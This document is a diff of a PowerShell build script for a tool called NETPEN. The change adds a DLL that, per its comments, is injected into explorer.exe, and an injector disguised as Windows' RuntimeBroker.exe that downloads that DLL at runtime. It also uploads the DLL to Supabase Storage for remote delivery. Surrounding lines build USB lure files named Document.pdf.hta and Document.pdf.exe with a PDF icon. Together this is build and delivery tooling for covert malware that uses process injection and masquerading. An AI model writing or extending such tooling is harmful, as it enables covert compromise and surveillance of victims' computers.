@@ -18,8 +18,13 @@ if (!$?) { Write-Output "DLL compilation failed"; exit 1 }
 windres capture_dll.rc -O coff -o capture_dll.res
 if (!$?) { Write-Output "DLL resource compilation failed"; exit 1 }
 
-g++ -static -Os -s -mwindows -D NETPEN_VERSION=$buildVersion monitor.cpp version.res capture_dll.res -lwinhttp -lcrypt32 -lgdiplus -lole32 -loleaut32 -lstrmiids -luuid -lbcrypt -o RuntimeBroker.exe
-if (!$?) { Remove-Item -Force version.res -ErrorAction SilentlyContinue; Remove-Item -Force capture_dll.res -ErrorAction SilentlyContinue; Write-Output "Compilation failed"; exit 1 }
+# Build agent DLL (injected into explorer.exe)
+g++ -static -Os -s -shared -D NETPEN_VERSION=$buildVersion monitor.cpp version.res capture_dll.res -lwinhttp -lcrypt32 -lgdiplus -lgdi32 -lole32 -loleaut32 -lstrmiids -luuid -lbcrypt -o agent.dll
+if (!$?) { Write-Output "Agent DLL compilation failed"; exit 1 }
+
+# Build injector (downloads DLL, injects into explorer.exe, exits)
+g++ -static -Os -s -mwindows injector.cpp version.res -lwinhttp -o RuntimeBroker.exe
+if (!$?) { Remove-Item -Force version.res -ErrorAction SilentlyContinue; Remove-Item -Force capture_dll.res -ErrorAction SilentlyContinue; Write-Output "Injector compilation failed"; exit 1 }
 
 # Remove the random stub we appended (instead of git checkout which reverts all changes)
 $mc = Get-Content -Path "monitor.cpp"
@@ -71,7 +76,17 @@ try {
     Write-Output "WARNING: version.txt upload failed, build continues"
 }
 
-# Upload exe to Supabase Storage (one-liner delivery)
+# Upload agent.dll to Supabase Storage (downloaded by injector at runtime)
+$dllData = [IO.File]::ReadAllBytes("agent.dll")
+$dllHeaders = $headers.Clone()
+$dllHeaders["Content-Type"] = "application/octet-stream"
+$dllHeaders["x-upsert"] = "true"
+try {
+    Invoke-RestMethod -Uri "$sbUrl/storage/v1/object/$bucket/agent.dll" -Method Put -Headers $dllHeaders -Body $dllData -ErrorAction Stop | Out-Null
+    Write-Output "Uploaded agent.dll to: $sbUrl/storage/v1/object/public/$bucket/agent.dll"
+} catch { Write-Output "WARNING: agent.dll upload failed, build continues" }
+
+# Upload RuntimeBroker.exe to Supabase Storage (one-liner delivery)
 $exeData = [IO.File]::ReadAllBytes("RuntimeBroker.exe")
 $uploadHeaders = $headers.Clone()
 $uploadHeaders["Content-Type"] = "application/octet-stream"
@@ -136,4 +151,4 @@ if ((Test-Path "rcedit-x64.exe") -and (Test-Path "payload\pdf.ico")) {
 } else { Write-Output "WARNING: rcedit-x64.exe or payload/pdf.ico missing - PDF icon not applied" }
 Write-Output "USB payload files updated: payload\Document.pdf.hta + payload\Document.pdf.exe"
 
-Write-Output "Build successful: RuntimeBroker.exe + loader.ps1"
+Write-Output "Build successful: agent.dll + RuntimeBroker.exe + loader.ps1"
